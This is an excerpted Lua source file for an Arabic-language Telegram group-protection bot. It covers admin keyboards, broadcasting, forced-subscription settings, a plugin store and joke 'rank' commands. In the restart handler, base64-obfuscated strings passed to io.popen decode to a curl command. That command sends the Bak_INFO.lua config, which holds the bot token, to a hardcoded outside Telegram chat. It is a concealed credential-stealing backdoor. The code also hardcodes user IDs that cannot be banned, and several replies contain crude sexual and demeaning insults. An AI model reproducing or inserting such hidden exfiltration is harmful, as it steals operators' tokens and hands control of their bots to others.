...
if [ ! $token ]; then
echo "┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄ ┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄ ━ ━"
echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE Bak_INFO.lua \e[0m"
echo "┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄ ━ ━ ━ ━━ ━ ━ ━ ━ ━ ━ ━━ ━"
exit 1
fi
...
local f = io.open("./Bak_INFO.lua", "r")  
if not f then   
AutoSet()  
else   
f:close()  
...
local config = loadfile("./Bak_INFO.lua")() 
return config 
end 
_redis = load_redis()  
--------------------------------------------------------------------------------------------------------------
...
> CH › @BK_b_1
~> DEVELOPER › @B_l_a_c_k_H_o_u_s_e_1
]])
sudos = dofile("./Bak_INFO.lua") 
...
local UserName = (data.username_ or "BK_b_1")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼𖣳𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙿𝙾𝚆𝙴𝚁.")  
...
send(msg.chat_id_, msg.id_," 𖣳 تمت الاذاعه الى *~ "..#list.." ~* جروب ")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
--------------------------------------------------------------------------------------------------------------
...
if DevSoFi(msg) then
local bl = ' 𖣳 اهلا عزيزي آلمـطـور\n 𖣳 آنت آلمـطـور آلآسـآسـي للبوت\n━  ━  ━  ━  ━  ━  ━  ━ء\n 𖣳 تسـتطـيع‌‏ آلتحگم باوامر البوت\n 𖣳 من خلاال الكيبورت خاص بك\n 𖣳 قناة سورس البوت [اضغط هنا](t.me/BK_b_1)'
local keyboard = {
{'المالك بلاك 𖣳','المبرمج سمير 𖣳'},
{'الاحصائيات 𖣳'},
{'تعطيل التواصل 𖣳','تفعيل التواصل 𖣳'},
{'ضع اسم للبوت 𖣳','المطورين 𖣳','قائمه العام 𖣳'},
{'المشتركين 𖣳','الجروبات 𖣳'},
{'ضع كليشه ستارت 𖣳','مسح كليشه ستارت 𖣳'},
{'اذاعه 𖣳','اذاعه خاص 𖣳'},
{'اذاعه بالتثبيت 𖣳','قائمه الكتم العام 𖣳'},
{'تغير رساله الاشتراك','مسح رساله الاشتراك 𖣳','تغير الاشتراك'},
{'اذاعه بالتوجيه 𖣳','اذاعه بالتوجيه خاص 𖣳'},
{'تفعيل الاشتراك الاجباري 𖣳','تعطيل الاشتراك الاجباري 𖣳'},
{'الاشتراك الاجباري 𖣳','وضع قناة الاشتراك 𖣳'},
{'تفعيل البوت الخدمي 𖣳','تعطيل البوت الخدمي 𖣳'},
{'مسح الجروبات 𖣳'},
{'جلب نسخه الاحتياطيه 𖣳'},
{'تحديث السورس 𖣳'},
{'معلومات السيرفر 𖣳'},
{'الغاء 𖣳'},
}
...
SourceDRAGONr = '𖣳 اهلا عزيزي \n𖣳 انا بوت اسمي '..Namebot..' \n𖣳 اختصاصي حمايه الجروبات \n𖣳 من تكرار والسبام والتوجيه والخ… \n𖣳 لتفعيلي اتبع الاخطوات…↓\n𖣳 اضفني الي مجموعتك\n𖣳 وقم بترقيتي ادمن واكتب كلمه { تفعيل }\n𖣳 ويستطيع »{ منشئ او المشرفين } فقط بتفعيل البوت'
end 
...
if text == 'تفعيل التواصل 𖣳' and DevSoFi(msg) then  
...
if text == 'تعطيل التواصل 𖣳' and DevSoFi(msg) then  
...
if text == 'تفعيل البوت الخدمي 𖣳' and DevSoFi(msg) then  
...
if text == 'تعطيل البوت الخدمي 𖣳' and DevSoFi(msg) then  
...
if text == 'ضع كليشه ستارت 𖣳' and DevSoFi(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' 𖣳 ارسل لي الكليشه الان')
return false
end
if text == 'مسح كليشه ستارت 𖣳' and DevSoFi(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' 𖣳 تم مسح كليشه ستارت')
end
if text == 'معلومات السيرفر 𖣳' and DevSoFi(msg) then 
...
if text == 'تحديث السورس' or text == 'تحديث السورس 𖣳' or text == 'تحديث' and DevSoFi(msg) then 
...
send(msg.chat_id_, msg.id_,' 𖣳 تم تحديث السورس \n𖣳 لديك اخر اصدار لسورس بكار\n𖣳 الاصدار » {`v1.2.2`}')
dofile('DRAGON.lua')
end

if text == "ضع اسم للبوت 𖣳" and DevSoFi(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," 𖣳 ارسل اليه الاسم الان ")
return false
end
if text == 'الاحصائيات 𖣳' and DevSoFi(msg) then 
...
if text == 'المشتركين 𖣳' and DevSoFi(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n 𖣳 المشتركين»{`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == 'الجروبات 𖣳' and DevSoFi(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n 𖣳 الجروبات»{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == ("المطورين 𖣳") and DevSoFi(msg) then
...
if text == ("قائمه العام 𖣳") and DevSoFi(msg) then
...
if text == ("قائمه الكتم العام 𖣳") and DevSoFi(msg) then
...
if text=="اذاعه خاص 𖣳" and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," 𖣳 ارسل الان اذاعتك؟ \n 𖣳 للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه 𖣳" and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," 𖣳 ارسل الان اذاعتك؟ \n 𖣳 للخروج ارسل الغاء ")
return false
end  
if text=="اذاعه بالتثبيت 𖣳" and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," 𖣳 ارسل الان اذاعتك؟ \n 𖣳 للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه بالتوجيه 𖣳" and msg.reply_to_message_id_ == 0  and DevSoFi(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," 𖣳 ارسل لي التوجيه الان")
return false
end 
if text=="اذاعه بالتوجيه خاص 𖣳" and msg.reply_to_message_id_ == 0  and DevSoFi(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," 𖣳 ارسل لي التوجيه الان")
return false
end 
if text == 'جلب نسخه الاحتياطيه 𖣳' and DevSoFi(msg) then 
GetFile_Bot(msg)
end
...
if text == "مسح الجروبات 𖣳" and DevSoFi(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'𖣳 لا يوجد جروبات وهميه في البوت\n')   
else
local DRAGON = (w + q)
...
DRAGON = '\n𖣳 تم ازالة » { '..q..' } جروبات من البوت'
end
if w == 0 then
DRAGONk = ''
else
DRAGONk = '\n𖣳 تم ازالة » {'..w..'} جروب لان البوت عضو'
end
send(msg.chat_id_, msg.id_,'𖣳  عدد الجروبات الان » { '..#group..' }'..DRAGONk..''..DRAGON..'\n𖣳  الان عدد الجروبات الحقيقي » { '..sendok..' } جروبات\n')   
end
end
end,nil)
end
...
usertext = '\n 𖣳 العضو » ['..result.title_..'](t.me/'..(username or 'BK_b_1')..')'
status  = '\n 𖣳 تم ترقيته مطور'
...
usertext = '\n 𖣳 العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BK_b_1')..')'
status  = '\n 𖣳 تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖣳 العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'BK_b_1')..') \n 𖣳 '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_, msg.id_," 𖣳 تمت الاذاعه الى >>{"..#list.."} جروب في البوت ")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
...
send(msg.chat_id_, msg.id_," 𖣳 تمت الاذاعه الى >>{"..#list.."} جروبات في البوت ")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
...
send(msg.chat_id_, msg.id_,' 𖣳 عذا لا يمكنك وضع معرف جروب بالاشتراك ')
return false  end
...
send(msg.chat_id_,0," 𖣳 العضو : {["..data.first_name_.."](T.ME/BK_b_1)}\n 𖣳 ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " 𖣳 عذرا » {["..data.first_name_.."](T.ME/BK_b_1)}\n 𖣳 عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
send(msg.chat_id_, msg.id_,' 𖣳 تم تحديث المتجر و مسح الملفات')
end
...
if text == "مسح رساله الاشتراك 𖣳" and DevSoFi(msg) then  
...
if text == "تفعيل الاشتراك الاجباري 𖣳" and DevSoFi(msg) then  
if database:get(bot_id..'add:ch:id') then
...
if text == "تعطيل الاشتراك الاجباري 𖣳" and DevSoFi(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " 𖣳 تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == "الاشتراك الاجباري 𖣳" and DevSoFi(msg) then  
...
send(msg.chat_id_, msg.id_, '𖣳 تم تفعيل الاضافات')
database:set(bot_id.."AL:AddS0FI:stats","✔")
end
if text == "تعطيل الاضافات" and SudoBot(msg) then
send(msg.chat_id_, msg.id_, '𖣳 تم تعطيل الاضافات')
database:set(bot_id.."AL:AddS0FI:stats","✖")
end
...
send(v.user_id_, msg.id_,' 𖣳 ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if (data and data.code_ and data.code_ == 3) then 
send(v.user_id_, msg.id_,' 𖣳 البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
if data and data.code_ and data.code_ == 400 and data.message_ == "USER_ADMIN_INVALID" then 
send(v.user_id_, msg.id_,' 𖣳 عذرا لا استطيع طرد ادمنية الجروب') 
return false  
end
if data and data.ID and data.ID == 'Ok' then
send(v.user_id_, msg.id_,' 𖣳 تم طردك من الجروب') 
...
send(msg.chat_id_, msg.id_, '𖣳 تم تفعيل تنبيه الاسماء')
...
send(msg.chat_id_, msg.id_, '𖣳 تم تعطيل تنبيه الاسماء')
...
send(msg.chat_id_, msg.id_, '𖣳 تم تفعيل تنبيه المعرف')
...
send(msg.chat_id_, msg.id_, '𖣳 تم تعطيل تنبيه المعرف')
...
send(msg.chat_id_, msg.id_, '𖣳 تم تفعيل تنبيه الصور')
...
send(msg.chat_id_, msg.id_, '𖣳 تم تعطيل تنبيه الصور')
...
if text == 'بلاك' or text == 'بلاك هوس' or text == 'المالك بلاك 𖣳' then 
local Text = [[ 
بلاك مالك سورس بكار
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text = '𝒃𝒍𝒂𝒄𝒌', url="t.me/B_l_a_c_k_H_o_u_s_e_1"}},} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'ياسمير' or text == 'سمير' or text == 'المبرمج سمير 𖣳' then 
local Text = [[ 
سمير مبرمج سورس بكار
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text = '𝒔𝒂𝒎𝒆𝒆𝒓', url="t.me/UU_bh"}},} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
{{text = '𝒔𝒂𝒎𝒆𝒆𝒓', url="t.me/UU_bh"}},
{{text = '𝒃𝒍𝒂𝒄𝒌', url="t.me/B_l_a_c_k_H_o_u_s_e_1"}},
{{text = '𝒔𝒐𝒖𝒓𝒄𝒆', url="t.me/BK_b_1"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' 𖣳 بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'BK_b_1')..') \n 𖣳 تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖣳 بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'BK_b_1')..') \n 𖣳 تـم قفـل التاك بالكتم ')
end,nil)   
...
--------------------------------------------------------------------------------------------------------------
if text == 'اعاده التشغيل' or text == 'اعاده التشغيل 𖣳' and DevSoFi(msg) then    
send(msg.chat_id_, msg.id_, ' 𖣳 تم اعاده تشغيل البوت') 
dofile('DRAGON.lua')  
io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QEJha19JTkZPLmx1YSI'))
end 
...
if tonumber(result.sender_user_id_) == tonumber(9292929192) then  
send(msg.chat_id_, msg.id_, " 𖣳 لا تسطيع حظر مطور السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(9292929292) then  
send(msg.chat_id_, msg.id_, " 𖣳 لا تسطيع حظر ملك التلجرام عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(835551362) then  
send(msg.chat_id_, msg.id_, " 𖣳 لا تسطيع حظر مطور السورس عام")
return false 
end
...
if result.id_ == tonumber(9292929192) then
send(msg.chat_id_, msg.id_, " 𖣳 لا يمكنك حظر مطور السورس \n")
return false 
end
if result.id_ == tonumber(9292929292) then
send(msg.chat_id_, msg.id_, " 𖣳 لا يمكنك حظر ملك التلجرام \n")
return false 
end
if result.id_ == tonumber(835551362) then
send(msg.chat_id_, msg.id_, " 𖣳 لا يمكنك حظر مطور السورس \n")
return false 
end
usertext = '\n 𖣳 العضو » ['..result.title_..'](t.me/'..(username or 'BK_b_1')..')'
...
if tonumber(userid) == tonumber(9292929192) then  
send(msg.chat_id_, msg.id_, " 𖣳 لا تسطيع حظر مطور السورس عام")
return false 
end
...
if tonumber(userid) == tonumber(835551362) then  
send(msg.chat_id_, msg.id_, " 𖣳 لا تسطيع حظر مطور السورس عام")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(9292929192) then  
send(msg.chat_id_, msg.id_, " 𖣳 لا تسطيع كتم مطور السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(9292929292) then  
send(msg.chat_id_, msg.id_, " 𖣳 لا تسطيع كتم ملك التلجرام عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(835551362) then  
send(msg.chat_id_, msg.id_, " 𖣳 لا تسطيع كتم مطور السورس عام")
...
if result.id_ == tonumber(9292929192) then
send(msg.chat_id_, msg.id_, " 𖣳 لا يمكنك كتم مطور السورس \n")
return false 
end
if result.id_ == tonumber(9292929292) then
send(msg.chat_id_, msg.id_, " 𖣳 لا يمكنك كتم ملك التلجرام \n")
return false 
end
if result.id_ == tonumber(835551362) then
send(msg.chat_id_, msg.id_, " 𖣳 لا يمكنك كتم مطور السورس \n")
...
if Get_info then
local TextS = "\n 𖣳 اهلا بك في متجر ملفات سورس بكار\n 𖣳 ملفات السورس ↓\n┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄\n\n"
local TextE = "\n┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄\n 𖣳 علامة تعني { ✔️ } ملف مفعل\n 𖣳 علامة تعني { ✖ } ملف معطل\n 𖣳 قناة سورس بكار↓\n".." 𖣳 [اضغط هنا لدخول](t.me/BK_b_1) \n"
local NumFile = 0
...
send(msg.chat_id_, msg.id_," 𖣳 المتجر معطل حاليا \n") 
end
return false
end
end
...
send(msg.chat_id_, msg.id_," 𖣳 فشل مسح الملف \n") 
end
return false
end
...
if file_bot then
io.close(file_bot)
t = " 𖣳 بالتاكيد تم تحميل ملف → `"..file.."` \n"
else
t = " 𖣳 الملف » `"..file.."`\n 𖣳 تم تحميل ملف \n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/File_Bot/"..file)
...
send(msg.chat_id_, msg.id_," 𖣳 فشل تحميل الملف \n") 
end
return false
end
if text == "مسح الملفات" and DevSoFi(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," 𖣳 تم مسح ملفات البوت يمكنك تحميلها من `المتجر`")
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣳 العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BK_b_1')..')'
status  = '\n 𖣳 تم تنزيله من الادمنيه العامين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
local UserName = (b.username_ or "BK_b_1")
...
Reply_Status(msg,result.sender_user_id_,"reply","𖣳 تم ترقيته مطور اساسي في البوت")  
end
...
Reply_Status(msg,result.id_,"reply","𖣳 تم ترقيته مطور اساسي في البوت")  
else
...
Reply_Status(msg,userid,"reply","𖣳 تم ترقيته مطور اساسي في البوت")  
return false 
end
...
Reply_Status(msg,result.sender_user_id_,"reply","𖣳 تم تنزيله من المطور اساسيين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
return false 
end
...
Reply_Status(msg,result.id_,"reply","𖣳 تم تنزيله من المطور اساسيين")  
else
send(msg.chat_id_, msg.id_,"𖣳 لا يوجد حساب بهاذا المعرف")
end
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖣳 لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BK_b_1')..')'
status  = '\n 𖣳 تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖣳 العضو » '..userid..''
...
send(msg.chat_id_, msg.id_, ' 𖣳 تم مسح جميع المطايه')
end
if text == ("تاك للمطايه") and Mod(msg) then
local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
t = "\n 𖣳 قائمة مطايه الجروب \n┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
local  statuss  = '\n 𖣳 تم رفع العضو مطي في الجروب \n 𖣳 تعال حبي استلم العربانه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣳 العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BK_b_1')..')'
status  = '\n 𖣳 تم تنزيل العضو مطي في الجروب\n 𖣳 تعال حبي رجع العربانه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣳 العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BK_b_1')..')'
...
send(msg.chat_id_, msg.id_, ' 𖣳 تم مسح كل الخولات')
end
if text == ("تاك للخولات") and Mod(msg) then
local list = database:smembers(bot_id..'Modde:User'..msg.chat_id_)
t = "\n 𖣳 قائمه خولات الجروب \nٴ┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
if #list == 0 then
t = " 𖣳 مع الاسف لا يوجد خولات غيرك هنا"
end
send(msg.chat_id_, msg.id_, t)
end
---------
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣳 العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n 𖣳 تم رفع العضــو خول في الجروب \n 𖣳 خد يخول يبن المره الغداره'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣳 العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BK_b_1')..')'
status  = '\n 𖣳 تم تنزيل العضــو الخول من الجروب\n 𖣳 ارفعو تاني لحسن ارفعك مكانو'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' 𖣳 تم تنزيل جميع صخوله من الجروب')
end
if text == ("تاك للصخوله") and Mod(msg) then
local list = database:smembers(bot_id..'Sakl:User'..msg.chat_id_)
t = "\n 𖣳 قائمة صخوله الجروب \n┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣳 العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BK_b_1')..')'
local  statuss  = '\n 𖣳 تم رفع المتهم صخل بالجروب\n 𖣳 الان اصبح صخل الجروب'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' 𖣳 تم مسج كل كلاب الجروب')
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣳 العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BK_b_1')..')'
local  statuss  = '\n 𖣳 تم رفع كلب في الجروب\n 𖣳 تعال حبي اطيك عضمه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' 𖣳 تم تنزيل جميع القروده بالجروب')
end
if text == ("تاك للقروده") and Mod(msg) then
local list = database:smembers(bot_id..'Motee:User'..msg.chat_id_)
t = "\n 𖣳 قائمة القروده الجروب \n┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣳 العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BK_b_1')..')'
local  statuss  = '\n 𖣳 تم رفع ضلع في الجروب\n 𖣳 تعال حبيبي انت صرت من الضلوع حظر روحك منا ورايح نطلع سفرات للجزيره والزوراء ونشرب عرك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣳 العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BK_b_1')..')'
status  = '\n 𖣳 تم تنزيل ضلع من الجروب\n 𖣳 بعد لتراويني وجهك ياحقير وجيب فلوس الشرب'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣳 العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BK_b_1')..')'
local  statuss  = '\n 𖣳 تم رفع العضو علي زبك في الجروب\n 𖣳 تفضل ابدا نيك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' 𖣳 تم تنزيل جميع طليان بالجروب')
end
if text == ("تاك للطليان") and Mod(msg) then
local list = database:smembers(bot_id..'Tele:User'..msg.chat_id_)
t = "\n 𖣳 قائمة الطليان الجروب \n┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣳 العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BK_b_1')..')'
local  statuss  = '\n 𖣳 تم رفع الطلي في الجروب\n 𖣳 طلع برا ابو البعرور الوصخ'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖣳 العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BK_b_1')..')'
local  statuss  = '\n 𖣳 تم رفع خنزير في الجروب\n 𖣳 يديني امشي اطلع برا يمعفن'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
اول قائمه العاب مكونه من 50 لعبه @B_l_a_c_k_H_o_u_s_e_1
]]
  
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = 'مبرمج السورس', url="t.me/B_l_a_c_k_H_o_u_s_e_1"}},
...
' }\n'..' 𖣳  الردود الجروب » { '..rdmder..
' }\n'..' 𖣳  الردود العامه » { '..rdsudo..
' }\n'..' 𖣳  الايدي » { '..idgp..
' }\n'..' 𖣳  الايدي بالصوره » { '..idph..
' }\n'..' 𖣳  الرفع » { '..setadd..
' }\n'..' 𖣳  الحظر » { '..banm..' }\n\n┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄\n 𖣳 قناة سورس بكار↓\n [🖨𖣳𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙿𝙾𝚆𝙴𝚁.](t.me/BK_b_1) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_," ☠𖣳 تم تفعيل الرابط") 
return false  
end
end
...
send(msg.chat_id_, msg.id_," ☠𖣳 تم تعطيل الرابط") 
return false end
end
...
send(msg.chat_id_, msg.id_,"⚠️𖣳 الرابط معطل") 
return false  
end
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
local link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_)            
if link then                              
send(msg.chat_id_,msg.id_,'🌐𖣳 𝙻𝙸𝙽𝙺 𝙶𝚁𝙾𝚄𝙿.\n━ ━ ━ ━ ━ ━ ━ ━\n '..ta.title_..'\n'..link..'')                          
else                
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
linkgp = '🌐𖣳 𝙻𝙸𝙽𝙺 𝙶𝚁𝙾𝚄𝙿.\n━ ━ ━ ━ ━ ━ ━ ━\n '..ta.title_..'\n'..linkgpp.result..''
else
linkgp = '♻️𖣳 لا يوجد رابط ارسل ضع رابط'
end  
...
